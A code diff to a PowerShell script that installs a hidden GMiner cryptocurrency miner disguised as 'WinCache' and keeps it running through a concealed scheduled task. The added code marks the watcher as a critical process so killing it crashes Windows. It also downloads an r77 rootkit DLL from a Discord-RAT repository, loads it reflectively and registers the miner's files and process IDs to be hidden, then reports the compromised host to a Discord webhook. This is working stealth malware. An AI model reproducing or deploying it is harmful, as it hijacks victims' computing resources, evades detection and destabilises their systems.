@@ -2,6 +2,7 @@
 <#
 .SYNOPSIS
     Deploys and runs GMiner from a hidden system folder using Task Scheduler.
+    Includes Critical Process protection and r77 Rootkit integration.
 .EXAMPLE
     .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
 .EXAMPLE
@@ -39,6 +40,30 @@ $scriptPath = $PSCommandPath
 if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
 
 # ---------- helpers ---------------------------------------------------------
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class NtProcess {
+    [DllImport("ntdll.dll")]
+    public static extern int NtSetInformationProcess(
+        IntPtr hProcess, int infoClass,
+        ref int info, int infoLength);
+}
+"@
+
+function Set-CriticalProcess {
+    param([int]$TargetPid, [bool]$Critical)
+    $isCritical = if ($Critical) { 1 } else { 0 }
+    $ProcessBreakOnTermination = 0x1D
+    try {
+        $handle = (Get-Process -Id $TargetPid -ErrorAction Stop).Handle
+        [NtProcess]::NtSetInformationProcess($handle, $ProcessBreakOnTermination, [ref]$isCritical, 4) | Out-Null
+        return $true
+    } catch {
+        return $false
+    }
+}
+
 function Send-DiscordWebhook {
     param(
         [string]$WebhookUrl,
@@ -102,12 +127,6 @@ if ($Diagnose) {
     if ($task) {
         Line 'Task Name' $task.TaskName
         Line 'State'     $task.State
-        $taskArgs = $task.Actions.Arguments
-        if ($taskArgs.Length -gt 100) {
-            Line 'Arguments' ($taskArgs.Substring(0, 100) + '... [truncado]')
-        } else {
-            Line 'Arguments' $taskArgs
-        }
     } else {
         Write-Host '  No hay tarea programada activa.' -ForegroundColor Yellow
     }
@@ -175,10 +194,15 @@ if (-not $Run -and -not $NoElevate) {
 
 # ---------- uninstall -------------------------------------------------------
 if ($Uninstall) {
+    Write-Host '[*] Deteniendo procesos de forma segura...'
+    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
+        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
+    foreach ($w in $watchers) {
+        Set-CriticalProcess -TargetPid $w.ProcessId -Critical $false | Out-Null
+        Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
+    }
+
     Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
-        Where-Object { $_.CommandLine -like '*WinCache.ps1*' } |
-        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
     
     Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
     
@@ -199,7 +223,6 @@ if ($Uninstall) {
 if ($Run) {
     New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
     
-    # Verificación de parámetros inyectados por el Programador de Tareas
     if (-not $Wallet -or -not $Pool -or -not $Algo) {
         Add-Content (Join-Path $LogDir 'error.log') "[$(Get-Date -f s)] CRITICAL: Faltan argumentos Wallet/Pool/Algo en -Run"
         exit 1
@@ -210,6 +233,41 @@ if ($Run) {
         $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
         Add-Content -Path $LogFile -Value "$ts [$Level] $Msg" -Encoding UTF8
     }
+
+    # HACER EL WATCHER CRÍTICO
+    $isCrit = Set-CriticalProcess -TargetPid $PID -Critical $true
+    if ($isCrit) {
+        Write-Session "Watcher marcado como PROCESO CRÍTICO."
+    }
+
+    # --- INTEGRACIÓN ROOTKIT (r77) ---
+    Write-Session "Iniciando integración de rootkit..."
+    $rkUrl = "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/rootkit.dll"
+    try {
+        # 1) Descargar rootkit.dll 
+        $bytes = (New-Object Net.WebClient).DownloadData($rkUrl)  
+        $asm   = [Reflection.Assembly]::Load($bytes)  
+        
+        # 2) Invocar el EntryPoint (instala los hooks del r77)  
+        $asm.EntryPoint.Invoke($null, @([string[]]@())) | Out-Null
+        Write-Session "Rootkit DLL cargado e inicializado correctamente."
+
+        # 3) rootkitaddpath: registrar la ruta a ocultar  
+        $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\paths')  
+        $rk.SetValue([IO.Path]::GetRandomFileName(), $Root, 'String')  
+        $rk.SetValue([IO.Path]::GetRandomFileName(), $ExePath, 'String')  
+        $rk.Close()  
+        Write-Session "Rutas ocultas registradas en el rootkit."
+
+        # 4) rootkitaddpid: registrar el PID a ocultar (Watcher)  
+        $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\pid')  
+        $rk.SetValue([IO.Path]::GetRandomFileName(), $PID, 'DWord')  
+        $rk.Close()  
+        Write-Session "PID del watcher ($PID) oculto en el rootkit."
+    } catch {
+        Write-Session "Error al integrar rootkit: $_" 'WARN'
+    }
+    # ---------------------------------
 
     $fatalRe = 'device not found|no (cuda|opencl|amd|nvidia|gpu) devices|unknown algo|authorization failed|out of memory|failed to (initialize|load)'
     $warnRe  = 'connection (refused|reset|closed|timed? ?out)|cannot connect|cuda error'
@@ -240,8 +298,17 @@ if ($Run) {
         $proc.StartInfo = $psi
         try {
             $proc.Start() | Out-Null
+            
+            # 5) Ocultar también el PID del Minero en el rootkit
+            try {
+                $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\pid')  
+                $rk.SetValue([IO.Path]::GetRandomFileName(), $proc.Id, 'DWord')  
+                $rk.Close()  
+                Write-Session "PID del minero ($($proc.Id)) oculto en el rootkit."
+            } catch {}
+
             if (-not $notifiedStart -and $DiscordWebhook) {
-                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo"
+                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`n*(Proceso Crítico y Rootkit Activados)*"
                 Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Miner Started Successfully" -Message $msg -Color 3066993 | Out-Null
                 $notifiedStart = $true
             }
@@ -359,7 +426,7 @@ if ([string]::IsNullOrWhiteSpace($Worker)) {
     $Worker = "rig_$shortHash"
 }
 
-# ---------- install self (con validación) -----------------------------------
+# ---------- install self ----------------------------------------------------
 if ($scriptPath -ne $SelfPs) {
     Copy-Item $scriptPath $SelfPs -Force
     Unblock-File $SelfPs -ErrorAction SilentlyContinue
@@ -376,7 +443,6 @@ if ($scriptPath -ne $SelfPs) {
 Write-Host '[*] Registrando tarea programada con parámetros inyectados...'
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 
-# Construimos la línea de argumentos completa
 $argList = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Wallet `"$Wallet`" -Pool `"$Pool`" -Algo `"$Algo`" -Worker `"$Worker`""
 if ($DiscordWebhook) { $argList += " -DiscordWebhook `"$DiscordWebhook`"" }
 $argList += " -Run -NoElevate"
@@ -390,9 +456,12 @@ Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Se
 Write-Host "[+] Auto-start instalado como Tarea Programada: $TaskName"
 
 # ---------- launch watcher (ahora mismo) ------------------------------------
-Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
-    Where-Object { $_.CommandLine -like '*WinCache.ps1*' } |
-    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+$oldWatchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
+    Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
+foreach ($w in $oldWatchers) {
+    Set-CriticalProcess -TargetPid $w.ProcessId -Critical $false | Out-Null
+    Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
+}
 Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 
 $p = $null
@@ -414,6 +483,7 @@ Write-Host ''
 Write-Host '=================================================='
 Write-Host '  Mining in background. Auto-start enabled via Task Scheduler.'
 Write-Host "  Install : $Root"
+Write-Host '  PROTECCIÓN: Proceso Crítico y Rootkit Activados.'
 Write-Host "  Log     : $LogFile"
 Write-Host ''
 Write-Host '  Follow log:'
@@ -421,9 +491,6 @@ Write-Host "    Get-Content `"$LogFile`" -Wait -Tail 20"
 Write-Host ''
 Write-Host '  Diagnose:'
 Write-Host '    .\Mine.ps1 -Diagnose'
-Write-Host ''
-Write-Host '  Test webhook:'
-Write-Host '    .\Mine.ps1 -TestWebhook -DiscordWebhook "<url>"'
 Write-Host ''
 Write-Host '  Stop everything:'
 Write-Host '    .\Mine.ps1 -Uninstall'
